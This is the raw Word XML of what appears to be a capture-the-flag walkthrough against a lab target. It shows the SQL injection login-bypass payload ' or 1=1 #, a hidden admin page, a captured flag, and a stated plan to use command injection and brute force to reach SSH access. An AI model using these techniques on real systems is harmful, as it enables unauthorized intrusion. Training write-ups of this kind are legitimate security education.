        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1470"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:shape id="_x0000_i1026" type="#_x0000_t75" style="width:468pt;height:122.25pt">
            <v:imagedata r:id="rId23" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37" w:line="378" w:lineRule="auto"/>
        <w:ind w:left="1726" w:right="8365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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>Wh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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>We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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>K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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t xml:space="preserve">w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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t xml:space="preserve">o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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>F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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>r: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 K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li IP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=</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1726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Ta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get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IP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=</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRPr="00FA582C" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1726"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>CP</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>22, 80</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1726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pict>
          <v:group id="_x0000_s1110" style="position:absolute;left:0;text-align:left;margin-left:78.75pt;margin-top:-82.9pt;width:457.25pt;height:185.35pt;z-index:-1893;mso-position-horizontal-relative:page" coordorigin="1575,-1658" coordsize="9145,3707">
            <v:shape id="_x0000_s1111" style="position:absolute;left:1575;top:-1658;width:9145;height:3707" coordorigin="1575,-1658" coordsize="9145,3707" path="m1575,2049r9145,l10720,-1658r-9145,l1575,2049xe" filled="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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We</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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b</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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si</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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e </w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ulne</w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">le </w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o SQL</w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>injection</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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– ‘ or </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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1</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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=1 #</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1726"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Hid</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">en </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ge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/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min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/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ol_pa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el.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hp</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1726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/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mi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/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nt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ol_pa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el.p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p co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nta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 w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>lag</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e cl</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA582C">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1726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FLA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G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1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- FL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G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{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n_p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an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el_sql_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y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ss}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1726"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:headerReference w:type="default" r:id="rId24"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pP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UE: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heck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he t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st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inte</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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fa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3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-- s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oppy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v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v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e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om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inj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ct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on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hol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3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>;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-)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--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nnie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080" w:right="4472"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Flag 2 –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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Mo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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>ve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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Fa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve">t and 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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>eak Thi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>gs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080" w:right="10009"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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O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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>b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je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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>v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e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="13" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1135"/>
        <w:jc w:val="both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U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e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mm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and injec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ion and brut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-for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 te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hn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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i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q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ues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o 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ala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 from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 xml:space="preserve"> w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b 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to full SSH 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s as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a lo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al u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er.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etrieve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ns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itive da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a left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b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ehind by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a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arele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devel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4"/>
          <w:szCs w:val="24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p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er and c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p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ture the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ond flag.</w:t>
      </w:r>
    </w:p>
